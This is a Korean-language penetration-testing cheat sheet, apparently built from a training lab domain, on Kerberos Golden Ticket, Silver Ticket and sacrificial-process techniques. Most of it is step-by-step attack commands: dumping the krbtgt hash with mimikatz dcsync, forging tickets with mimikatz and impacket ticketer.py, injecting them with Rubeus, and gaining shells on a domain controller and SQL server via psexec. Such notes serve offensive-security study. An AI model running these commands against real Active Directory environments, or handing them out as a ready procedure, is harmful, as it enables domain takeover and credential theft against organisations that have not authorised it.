## Golden Ticket
- krbtgt의 NTLM 해시를 사용하여 임의의 사용자에 대해 Domain Admins 권한이 담긴 PAC를 위조하고, 이를 기반으로 TGT를 직접 생성하는 공격.
- KDC 입장에서는 `krbtgt`키로 복호화가 가능하면 정상적인 티켓으로 확인하기 때문에 발생하는 구조적인 문제.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainSID
```
```
.\mimikatz.exe

mimikatz # lsadump::dcsync /user:krbtgt /domain:inlanefreight.local

mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```
```powershell
Enter-PSSession dc01
```

### Linux
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids

ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator

export KRB5CCNAME=./Administrator.ccache

psexec.py -k -no-pass dc01.inlanefreight.local
```

## Silver Ticket
- 서비스 계정의 NTLM 해시를 탈취한 경우, administrator 권한이 담긴 PAC를 위조하여 TGS를 직접 생성하고, 이를 서비스에 제출해 KDC 없이 접근 권한을 얻는 공격.
- 서비스 입장에서는 자신의 키로 복호화가 가능하면 정상적인 티켓으로 확인하기 때문에 발생한 취약점.

### Windows
```powershell
Import-Module .\PowerView.ps1

Get-DomainSID
```
```
.\mimikatz.exe

mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs  /ptt
```
```powershell
dir //sql01.inlanefreight.local/c$
```
```powershell
.\mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit
```
```powershell
.\Rubeus.exe createnetonly /program:cmd.exe /show
```
```powershell
# New Session
.\Rubeus.exe ptt /ticket:sql01.kirbi

.\PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
```

### Linux
```bash
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids

ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator

export KRB5CCNAME=./Administrator.ccache

psexec.py -k -no-pass sql01.inlanefreight.local
```

## Sacrificial Processes
- 기존의 세션을 보존하기 위한 방법.
```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
```powershell
.\Rubeus.exe triage

.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap

.\Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
```
